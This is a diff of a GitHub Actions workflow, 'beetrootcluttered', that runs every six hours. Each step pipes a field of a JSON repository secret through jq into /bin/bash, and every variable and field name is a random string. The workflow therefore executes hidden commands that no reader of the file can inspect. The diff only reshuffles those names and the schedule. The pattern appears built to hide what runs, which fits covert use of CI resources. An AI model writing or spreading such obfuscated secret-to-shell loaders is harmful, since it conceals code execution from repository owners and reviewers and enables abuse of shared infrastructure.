@@ -1,30 +1,30 @@
 name: beetrootcluttered
-
 on:
   workflow_dispatch:
   schedule:
-    - cron: '30 0/6 * * *'
-jobs:  # 32481
+    - cron: '43 3/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: beetrootcluttered
         env:
-          wlp1: ${{ secrets.wlp1 }}
+          cqyyc60581: ${{ secrets.cqyyc60581 }}
         run: |
-          echo $wlp1 | jq -r .aq84 | /bin/bash
-          echo $rujr04 | jq -r .fhi7 | /bin/bash
-          echo $xlud995 | jq -r .tnxzx92 | /bin/bash
-          echo $ezv89831 | jq -r .kwdko339 | /bin/bash
-          echo $ch4182 | jq -r .dtok92 | /bin/bash
-          echo $hm813 | jq -r .m55420 | /bin/bash
-          echo $pyl79777 | jq -r .fp944 | /bin/bash
-          echo $xcq6 | jq -r .hbgmm0176 | /bin/bash
-          echo $efsw00749 | jq -r .kkobl067 | /bin/bash
-          echo $unzdc16 | jq -r .uyvy1569 | /bin/bash
-          echo $ukkwq8 | jq -r .hiufi7 | /bin/bash
-          echo $e822 | jq -r .yz40368 | /bin/bash
-          echo $od8 | jq -r .llo36742 | /bin/bash
+          echo $cqyyc60581 | jq -r .fa0 | /bin/bash
+          echo $d26 | jq -r .wmi26 | /bin/bash
+          echo $ophz79 | jq -r .dj2750 | /bin/bash
+          echo $jov4 | jq -r .qnxo51 | /bin/bash
+          echo $wpstl77117 | jq -r .ogr6805 | /bin/bash
+          echo $q10555 | jq -r .aqo0934 | /bin/bash
+          echo $ku16250 | jq -r .si556 | /bin/bash
+          echo $haoye3110 | jq -r .zh3839 | /bin/bash
+          echo $bqw4079 | jq -r .dv26021 | /bin/bash
+          echo $ntfov9460 | jq -r .c33 | /bin/bash
+          echo $fxh902 | jq -r .vhs34125 | /bin/bash
+          echo $jj2641 | jq -r .stp0 | /bin/bash
+          echo $hnl39667 | jq -r .njw382 | /bin/bash
+          echo $kwqvb6190 | jq -r .fyc824 | /bin/bash
+          echo $jcsi82857 | jq -r .nndui640 | /bin/bash
 
